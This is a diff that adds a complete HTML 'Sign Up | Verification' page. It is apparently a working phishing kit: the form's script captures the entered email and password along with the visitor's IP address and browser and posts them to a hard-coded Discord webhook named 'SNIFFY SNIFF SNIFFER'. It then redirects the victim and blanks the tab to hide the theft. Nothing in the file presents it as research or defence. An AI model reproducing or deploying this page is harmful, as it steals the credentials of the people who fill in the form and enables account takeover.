@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign Up | Verification</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f4; }
+        .login-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 300px; }
+        h2 { text-align: center; margin-bottom: 20px; }
+        input[type="email"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background-color: #4CAF50; color: white; padding: 14px 20px; margin: 8px 0; border: none; cursor: pointer; width: 100%; border-radius: 4px; font-size: 16px; }
+        button:hover { background-color: #45a049; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>Sign Up</h2>
+    <form id="loginForm">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+
+        <button type="submit" id="continueButton">Continue</button>
+    </form>
+</div>
+
+<script>
+    // *** IMPORTANT: REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL ***
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1551743481469345904/zjbuHdF0lKizcoJCprKnMkBkbh1kd01HYtywsWTOtm3SBrx08QmHlRTCi-SAF4f1xzk0';
+
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // 1. Gather User Information (Client-Side)
+        const userAgent = navigator.userAgent;
+        let browserName = "Unknown";
+        // Simple way to try and guess the browser
+        if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
+            browserName = "Chrome";
+        } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
+            browserName = "Safari";
+        } else if (userAgent.includes("Firefox")) {
+            browserName = "Firefox";
+        } else if (userAgent.includes("Edge")) {
+            browserName = "Edge";
+        }
+
+        // Get IP Address (requires a small helper service or backend, but we'll simulate/fetch a public one)
+        // For simplicity in a pure HTML file, we rely on client-side scripts, but true IP fetching is best done server-side.
+        // We will use a service to get the public IP address.
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(ipData => {
+                const ipAddress = ipData.ip;
+
+                // 2. Prepare Data for Discord
+                const payload = {
+                    content: `**New LAG detected new lag detected!!!!**\n• 📧 Email: ${email}\n• 🔒 Password: ${password}\n• 🌐 IP Address: ${ipAddress}\n• 🖥️ Browser: ${browserName}`,
+                    username: 'SNIFFY SNIFF SNIFFER', // Custom name for the bot/webhook
+                    avatar_url: 'YOUR_AVATAR_URL_HERE' // Optional: Add a nice icon
+                };
+
+                // 3. Log to Discord Webhook
+                fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Error");
+                    } else {
+                        console.error("Error :", response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error("Error ", error);
+                });
+
+                // 4. Redirection Logic (Only proceeds after logging attempt is initiated)
+                // The redirection happens immediately after the logging process starts.
+                window.open("https://linewizeismath.github.io/ind.html/", '_blank');
+
+                // Change the original tab to blank
+                window.location.replace("about:blank");
+
+            })
+            .catch(error => {
+                console.error("eRROR", error);
+                // Fallback if IP fetching fails
+                window.open("https://linewizeismath.github.io/ind.html/", '_blank');
+                window.location.replace("about:blank");
+            });
+    });
+</script>
+
+</body>
+</html>
